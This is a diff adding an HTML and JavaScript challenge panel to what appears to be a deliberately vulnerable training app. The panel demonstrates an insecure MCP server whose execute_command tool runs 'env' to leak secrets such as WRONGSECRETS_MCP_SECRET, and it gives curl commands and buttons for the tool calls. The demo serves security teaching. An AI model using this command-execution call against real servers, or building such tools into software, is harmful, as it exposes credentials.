@@ -1,0 +1,46 @@
+<div id="mcp-challenge-container" style="border: 1px solid #ccc; border-radius: 8px; padding: 20px; margin: 20px; background-color: #f9f9f9;">
+    <h4>🤖 Insecure MCP Server Demo</h4>
+    <p>An insecure MCP (Model Context Protocol) server is running alongside this application on a dedicated port. It exposes an <code>execute_command</code> tool that leaks environment variables — including secrets.</p>
+
+    <div class="mcp-warning" style="border: 1px solid #ffeaa7; border-radius: 6px; padding: 15px; margin: 15px 0;">
+        <p><strong>⚠️ The MCP server is also reachable on the main port via <code>/mcp</code>.</strong></p>
+
+        <p>Step 1 — Discover what tools the MCP server exposes:</p>
+        <pre class="mcp-code" style="padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px;">curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'</pre>
+        <button class="btn btn-secondary btn-sm mcp-btn" onclick="mcpListTools()">▶ Run: tools/list</button>
+        <pre id="mcp-tools-output" class="mcp-output" style="display:none; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 12px; margin-top: 8px; white-space: pre-wrap; word-break: break-word;"></pre>
+
+        <p style="margin-top: 12px;">Step 2 — Call the <code>execute_command</code> tool to retrieve environment variables:</p>
+        <pre class="mcp-code" style="padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px;">curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'</pre>
+        <button class="btn btn-warning btn-sm mcp-btn" onclick="mcpGetEnv()">▶ Run: execute_command env</button>
+        <pre id="mcp-env-output" class="mcp-output" style="display:none; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 12px; margin-top: 8px; white-space: pre-wrap; word-break: break-word;"></pre>
+
+        <p style="margin-top: 12px;"><small class="mcp-tip">💡 Look for the <code>WRONGSECRETS_MCP_SECRET</code> key in the response above.</small></p>
+    </div>
+</div>
+
+<script>
+function mcpPost(payload, outputId) {
+    const out = document.getElementById(outputId);
+    out.style.display = 'block';
+    out.textContent = 'Loading…';
+    fetch('/mcp', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) { out.textContent = JSON.stringify(data, null, 2); })
+    .catch(function(err) { out.textContent = 'Failed to communicate with MCP server: ' + (err.message || err); });
+}
+function mcpListTools() {
+    mcpPost({"jsonrpc":"2.0","id":1,"method":"tools/list"}, 'mcp-tools-output');
+}
+function mcpGetEnv() {
+    mcpPost({"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}, 'mcp-env-output');
+}
+</script>
